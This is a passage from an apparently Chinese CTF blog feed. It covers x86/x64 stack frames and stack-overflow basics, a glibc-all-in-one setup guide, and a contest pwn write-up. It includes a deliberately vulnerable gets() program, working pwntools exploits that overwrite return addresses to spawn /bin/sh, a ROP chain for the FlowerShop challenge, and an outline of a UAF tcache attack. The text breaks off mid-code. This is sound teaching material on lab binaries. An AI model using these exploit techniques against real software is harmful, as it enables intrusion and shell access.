调用func_a函数完成</h3><p>①func_b函数调用完func_a函数后的栈布局</p><p>②至此，示例的函数已经调用完毕</p><img src="/post/47670/1729407589770-93d11168-b99e-4f54-8b27-3e004fbfb31a-1735222654797-159.png" class="" title="img"><p>③至此，示例的函数调用已经完毕</p><p>④现在，func_a执行完毕，要返回了</p><p>⑤该如何维护栈帧呢？</p><h3 id="2-5-leave指令"><a href="#2-5-leave指令" class="headerlink" title="2.5 leave指令"></a>2.5 leave指令</h3><p>①leave指令作用是维护栈帧，通常出现在函数的结尾，与ret连用</p><p>②其实际作用为</p><ul><li>mov rsp, rbp;</li><li>pop rbp;</li></ul><p>③将栈顶指针指向栈帧底部，然后在栈中弹出新的栈底指针</p><h3 id="2-6-返回func-a函数"><a href="#2-6-返回func-a函数" class="headerlink" title="2.6 返回func_a函数"></a>2.6 返回func_a函数</h3><p>①在一个函数执行结束返回时，会执行leave; ret ;</p><p>②实际效果就是：</p><ul><li>mov rsp rbp; 将栈顶指针指向现在的栈底</li><li>pop rbp; 将保存的栈底指针弹出</li><li>pop rip;执行下一条指令</li></ul><p>③func_a函数执行完毕返回后，栈布局如图：</p><img src="/post/47670/1729407589862-0fe2b72b-cabf-4b1a-8e64-d77023632cd5-1735222654797-160.png" class="" title="img"><p>③可以与之前func_b函数未调用func_a函数前的栈帧对比</p><p>④一模一样，说明已经恢复了栈帧</p><p>⑤唯一不同处就在于此程序的rip已经指向了c&#x3D;1</p><h3 id="2-7-返回func-b函数"><a href="#2-7-返回func-b函数" class="headerlink" title="2.7 返回func_b函数"></a>2.7 返回func_b函数</h3><p>①func_b函数执行完毕返回后，栈布局如图：</p><img src="/post/47670/1729407589926-dcee0fed-773c-491e-b301-aee4d9265abe-1735222654797-161.png" class="" title="img"><p>在这之后，main函数继续执行，直到结束。</p><h3 id="2-8函数调用流程总结"><a href="#2-8函数调用流程总结" class="headerlink" title="2.8函数调用流程总结"></a>2.8函数调用流程总结</h3><p>①调用函数：只需要将rip压栈，即push rip，然后将rip赋值为被调用函数的起始地址，这已操作被隐性的内置在call指令中。</p><p>②被调用函数：push rbp; mov rbp rsp; sub rsp xxx。</p><p>即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时就变成了被调用函数的栈底。</p><p>③函数返回：leave; ret; 翻译过来就是：mov rsp rbp; pop rbp; pop rip; 即恢复栈帧，返回调用函数的返回地址。</p><h2 id="3-调用约定"><a href="#3-调用约定" class="headerlink" title="3. 调用约定"></a>3. 调用约定</h2><p>函数返回值约定</p><ul><li>一般来说，一个函数的返回值会存储到RAX寄存器</li></ul><p>32位和64位程序参数调用约定</p><ul><li><p>x86</p></li><li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p></li><li><p>x64</p></li><li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p></li><li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p></li></ul><h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux 环境中，二进制可执行文件的类型是（Executable and Linkable Format）文件。</p><p>ELF 文件中包含许多个节(section)，各个节中存放不同的数据，这些节的信息存放在节头表中，主要包括</p><img src="/post/47670/1729742376286-84aedbcd-5134-4fb1-9cdf-730607cd8fbc-1735222654797-162.png" class="" title="img"><p>在 ida 中按下 Ctrl+s，可以看到各个节的信息</p><img src="/post/47670/1729742504846-f542b168-5048-4b5d-82b9-68bab938b6a6-1735222654797-163.png" class="" title="img"><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。</p><h3 id="32-位程序"><a href="#32-位程序" class="headerlink" title="32 位程序"></a>32 位程序</h3><p>举个C语言例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Hava already controlled it.&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br>    gets(s);<br>    <span class="hljs-built_in">puts</span>(s);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    vulnerable();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。从代码中可以看出main函数调用了vulnerable函数，但main函数和vulnerable函数都没有调用success函数，<strong>我们假设success函数中puts语句输出的内容即为我们的flag，那我们就希望获得succes函数中的flag</strong>，应该怎样获取flag呢，请往下看</p><p>使用以下命令编译程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -fno-stack-protector -no-pie pwn.c -o pwn32<br></code></pre></td></tr></table></figure><img src="/post/47670/1729694599728-2e9a39e0-ea9a-4ee2-8320-b11b28f673e6-1735222654797-164.png" class="" title="img"><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p><p>gcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 为了更加方便地介绍栈溢出的基本利用方式，使用-no-pie关闭 PIE（Position Independent Executable），避免加载基址被打乱。</p><p>编译成功后，可以使用checksec检查编译的文件</p><img src="/post/47670/1729694627992-6d9f5b2d-57fe-49e8-80ea-eab44841016d-1735222654797-165.png" class="" title="img"><p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看vulnerable 函数</p><img src="/post/47670/1729415597376-9ecc28cc-bd2b-4b61-b496-3a4ef0f2eb01-1735222654797-166.png" class="" title="img"><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">             +-----------------+<br>             |     retaddr     |<br>             +-----------------+<br>             |     saved ebp   |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为0x8049196</p><img src="/post/47670/1729694734686-0ee2abaf-3c57-4427-86e4-95672dad4fe2-1735222654797-167.png" class="" title="img"><p>那么如果我们读取的字符串为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span> + success_addr<br><span class="hljs-comment">#success_addr即为success函数地址</span><br></code></pre></td></tr></table></figure><p>由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr（返回地址） 覆盖为 success_addr，即0x8049196，此时的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">             +-----------------+<br>             |    0x08049186   |<br>             +-----------------+<br>             |       bbbb      |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 构造与程序交互的对象</span><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br>success_addr = <span class="hljs-number">0x8049196</span><br><span class="hljs-comment"># 构造payload</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4</span> + p32(success_addr)<br><span class="hljs-comment">#print(p32(success_addr))</span><br><span class="hljs-comment"># 向程序发送字符串</span><br>p.sendline(payload)<br><span class="hljs-comment"># 将代码交互转换为手动交互</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行 exp</p><img src="/post/47670/1729694852185-efb75896-5f88-4f67-9afd-564d99a40397-1735222654797-168.png" class="" title="img"><h3 id="64-位程序"><a href="#64-位程序" class="headerlink" title="64 位程序"></a>64 位程序</h3><p>C语言例子同上</p><p>使用以下命令编译程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -no-pie pwn.c -o pwn64<br></code></pre></td></tr></table></figure><img src="/post/47670/1729693237007-269ca430-7642-41d1-bbd0-c9421f4318f7-1735222654797-169.png" class="" title="img"><p>编译成功后，使用checksec检查编译的文件</p><img src="/post/47670/1729693266402-63709752-4749-401c-967a-d0e6f7dac4ae-1735222654797-170.png" class="" title="img"><p>我们同样利用 IDA 来反编译一下二进制程序并查看vulnerable 函数，该字符串距离 rbp 的长度为 0xC</p><img src="/post/47670/1729418446953-c66b8407-5364-40b8-8a80-9d2312b4bec1-1735222654797-171.png" class="" title="img"><p>如果我们同样按照 32 位程序的方法，将 success 函数的地址 0x401176 作为返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">success_addr = <span class="hljs-number">0x401176</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(success_addr)<br></code></pre></td></tr></table></figure><img src="/post/47670/1729693421434-141797d8-5234-4d5d-843b-b4d74a352bd7-1735222654797-172.png" class="" title="img"><p>写出 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success_addr = <span class="hljs-number">0x401176</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行脚本后，发现并没有获取到命令行的控制权</p><img src="/post/47670/1729695072591-d002a40f-a791-4ac4-8488-7ec354cbeaa9-1735222654797-173.png" class="" title="img"><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>那么究竟是什么原因导致没有获取到控制权，我们可以在脚本中加入调试语句，然后逐步调试寻找原因</p><p>调试脚本，使用 attach 语句将断点下在 gets 函数即 0x4011BC 处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success_addr = <span class="hljs-number">0x401176</span><br><br>attach(p, <span class="hljs-string">&#x27;b *0x4011BC&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>输入 ni 指令回车</p><img src="/post/47670/1729695670527-12e448a1-06a9-4ea8-a976-1d235c86c8d5-1735222654797-174.png" class="" title="img"><p>同时，我们关注汇编窗口，然后一直回车</p><img src="/post/47670/1729695707477-e316e653-d8ce-4c86-a983-173f419efde0-1735222654797-175.png" class="" title="img"><p>当程序运行至 vulerable 函数处，我们可以放慢速度并观察程序运行情况</p><img src="/post/47670/1729695828137-bcf5b41f-0836-4baf-89c6-16db12e603cd-1735222654797-176.png" class="" title="img"><p>当执行完 puts 函数之后可以看到程序打印了输入内容</p><img src="/post/47670/1729696069104-9bbf445d-6904-4c9b-9619-97cb189a9447-1735222654797-177.png" class="" title="img"><p>继续回车，发现程序已经运行至 success 函数，执行完 puts 之后将内容打印</p><img src="/post/47670/1729696160504-e8a73f85-de9c-4033-9c18-787bbb0dbee4-1735222654797-178.png" class="" title="img"><p>继续回车，当程序执行到 system 时注意观察</p><img src="/post/47670/1729696280049-405101de-4a8c-404f-b557-4160fa1ecb79-1735222654797-179.png" class="" title="img"><p>回车之后，程序会跳入 do_system 函数执行</p><img src="/post/47670/1729696357940-cd504cab-30fc-4019-bef6-6da0bdfe3299-1735222654798-180.png" class="" title="img"><p>再次回车之后发现程序并没有继续执行，这实际上是程序卡在了 movaps 指令上，这个指令涉及到 <code>xmm</code> 寄存器，该寄存器为128位，就要求 rsp 为 16 字节对齐。16字节对齐意味着 rsp 地址必须能够被16整除，即地址的最低4位（在二进制表示中）必须为0。</p><p>那么应该怎样进行 16 字节对齐呢，具体方法就是跳过 success 函数中一条栈指令即 push rbp ，减少⼀次对栈的操作，然后选用 0x40117B 作为返回地址。</p><img src="/post/47670/1729697167631-257581c7-6a3b-4d5a-a77d-9425dd79676f-1735222654798-181.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success1_addr = <span class="hljs-number">0x40117B</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x4011BC&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success1_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行脚本</p><img src="/post/47670/1729697249664-49cf7e81-9dc2-4720-93d6-b643c04c049a-1735222654798-182.png" class="" title="img"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li><p>输入</p><ul><li><p>gets，直接读取一行，忽略’\x00’</p></li><li><p>scanf</p></li><li><p>vscanf</p></li></ul></li><li><p>输出</p><ul><li><p>sprintf</p></li><li><p>字符串</p></li><li><p>strcpy，字符串复制，遇到’\x00’停止</p></li><li><p>strcat，字符串拼接，遇到’\x00’停止</p></li><li><p>bcopy</p></li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><h2 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h2><p><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>glibc-all-in-one添加libc</title>
    <link href="/post/17727.html"/>
    <url>/post/17727.html</url>
    
    <content type="html"><![CDATA[<h1 id="glibc-all-in-one介绍"><a href="#glibc-all-in-one介绍" class="headerlink" title="glibc-all-in-one介绍"></a>glibc-all-in-one介绍</h1><p>一个方便的 glibc 二进制和调试文件下载器以及源代码自动构建器</p><p>特点：</p><ul><li>下载 glibc 二进制文件</li><li>下载 glibc 调试文件</li><li>提取自定义 glibc</li><li>下载并编译 glibc 源代码</li></ul><p>github地址：<a href="https://github.com/matrix1001/glibc-all-in-one">glibc-all-in-one</a></p><h1 id="添加libc"><a href="#添加libc" class="headerlink" title="添加libc"></a>添加libc</h1><p>由于在做堆题的时候会碰到一些不常见的 libc 或者 libc 的小版本，而且在 glibc-all-in-one 中也找不到这些 libc，那么是不是可以手动添加这些 libc 呢，对于这一点官方也给出了对应的添加方法。</p><p>官方给出的方法中，我们需要下载 libc6 和libc6-dbg两个deb包，然后使用他给出的 extract 工具来进行添加。</p><img src="/post/17727/1735134759907-5e7187b1-e74e-4430-893b-4dea8ce13382.png" class="" title="img"><p>下面我们以 2.27-3ubuntu1.2 为例</p><p>先下载 libc6 的 deb 包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://launchpad.net/ubuntu/bionic/amd64/libc6/2.27-3ubuntu1.2<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135202942-3bf023b3-a7fc-44ec-b0b4-4c89c40dbd92.png" class="" title="img"><p>然后下载 libc6-dbg 的deb包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://launchpad.net/ubuntu/bionic/amd64/libc6-dbg/2.27-3ubuntu1.2<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135274778-7fe758c2-e21b-42c3-a256-738c8b82d5d2.png" class="" title="img"><p>我们新建一个文件夹来存放刚刚下载好的 libc6 和 libc6-dbg 两个 deb 包，这里我放在了<code>~/libc/2.27-3ubuntu1.2_amd64</code>。</p><img src="/post/17727/1735135309557-c2b76783-9795-401d-9a69-eb7dca50831e.png" class="" title="img"><p>在 glibc-all-in-one 下使用extract，生成的 libc 二进制文件我存放在了<code>glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract ~/libc/2.27-3ubuntu1.2_amd64/libc6_2.27-3ubuntu1.2_amd64.deb ~/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135607355-2c2c005d-7da6-463d-bc68-ee321b64c264.png" class="" title="img"><p>对于 libc6-dbg 生成的 libc 调试文件我放在了<code>glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/.debug</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract ~/libc/2.27-3ubuntu1.2_amd64/libc6-dbg_2.27-3ubuntu1.2_amd64.deb ~/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/.debug<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135750561-6c1cb8a6-5f0a-4263-b62e-81e172a61d6b.png" class="" title="img"><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/m0_52772399/article/details/128182925#:~:text=%E6%A0%B9%E6%8D%AE%E5%BC%95%E7%94%A8%E5%92%8C%E5%BC%95%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90">关于glibc-all-in-one缺失libc_2.23-0ubuntu10 glibc-all-in-one-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第四届长城杯网络安全大赛-初赛Pwn</title>
    <link href="/post/44739.html"/>
    <url>/post/44739.html</url>
    
    <content type="html"><![CDATA[<h1 id="FlowerShop"><a href="#FlowerShop" class="headerlink" title="FlowerShop"></a>FlowerShop</h1><p>这道题主要注意三点</p><p>一是 main 函数中，read 存在一个对 money的溢出，但后面还有一个溢出检测，即检测当输入过长时，输入中的特定位置是否与 c 相等，c 可以看到是一个字符串’pwn’。</p><p>先来计算一下，name 是 rbp-0x40，src 是 rbp-0xC，money 是 rbp-0x8，因此先输入 0x40-0xC&#x3D;0x34 个 a，接着要与 c 中的字符串相同，即再输入 ‘pwn’，剩下 5 字节的后 4 字节即可控制 money 的大小。</p><img src="/post/44739/1730988519568-d4bc95bf-94f5-4185-9485-badaa8ff70ef.png" class="" title="img"><img src="/post/44739/1730988545250-2aad0486-8790-4fce-b7cf-763fe15351c2.png" class="" title="img"><p>二是 magic 的值，可以看到在 shop 函数中，当购买了一个 magic 后，magic 被赋值为0x68732F6E69622，这实际上就是&#x2F;bin&#x2F;sh 字符串的 16 进制，因此程序中也就存在了&#x2F;bin&#x2F;sh 字符串</p><img src="/post/44739/1730989568065-e8a6823f-17dd-4027-84a8-c962840a4fdd.png" class="" title="img"><p>三是如何造成栈溢出，同样是 shop 函数，存在一个 read，但它的大小被限制为 size，而 size 在 check 函数。查看 check 函数，check 函数实际就是在判断 flower[0] 是否等于 2 和 flower[1] 是否等于 1，这里的 flower[0] 和 flower[1] 实际上就是影星玫瑰和卡布奇诺玫瑰，只要让影星玫瑰数量为 2 和卡布奇诺玫瑰数量为 1 就能返回 szie&#x3D;0x46，而这个大小足够进行栈溢出</p><img src="/post/44739/1730989688407-9e044b77-7eac-4534-b695-37b7e04fcfa1.png" class="" title="img"><img src="/post/44739/1730989993115-7ec8d503-57db-4641-9e18-0a130bc15a4e.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;8.147.129.22&#x27;, 15104)</span><br><br>ret_addr = <span class="hljs-number">0x4006f6</span><br>system_plt = <span class="hljs-number">0x400730</span><br>magic_addr = <span class="hljs-number">0x601840</span><br>pop_rdi_ret = <span class="hljs-number">0x400f13</span><br><br>p.recvuntil(<span class="hljs-string">&quot;请输入你的姓名:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x34</span> + <span class="hljs-string">b&#x27;pwna&#x27;</span>+<span class="hljs-string">b&#x27;99&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;请输入你的选项:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;请输入购买的商品序号:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;c&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;你想要继续买花吗? 1/0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;请输入购买的商品序号:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;你想要继续买花吗? 1/0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;请输入购买的商品序号:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;你想要继续买花吗? 1/0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;请输入购买的商品序号:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi_ret)+p64(magic_addr)<br>payload += p64(ret_addr) + p64(system_plt)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="KyLinHeap"><a href="#KyLinHeap" class="headerlink" title="KyLinHeap"></a>KyLinHeap</h1><p>标准菜单题，有 add、delete、edit 和 show 函数</p><img src="/post/44739/1735130120654-3838f58f-6cc9-4ee8-9da6-de065beef4a7.png" class="" title="img"><p>add 函数</p><img src="/post/44739/1735130242326-10d29c09-6ac1-4f90-b483-1ca7128302be.png" class="" title="img"><p>delete 函数存在 UFA 漏洞</p><img src="/post/44739/1735130350757-d4c1244e-64f6-4eb8-987b-0833774838b4.png" class="" title="img"><p>edit 函数不存在溢出</p><img src="/post/44739/1735130381304-ddc8ecf0-a902-4071-8ca0-bb50a3aab7a5.png" class="" title="img"><p>show 函数</p><img src="/post/44739/1735130416327-9c53f22f-e20a-4460-894e-ee6ffef3498c.png" class="" title="img"><p>libc2.31 的 UAF，泄露出 libc 之后打 tcache 为 free_hook</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 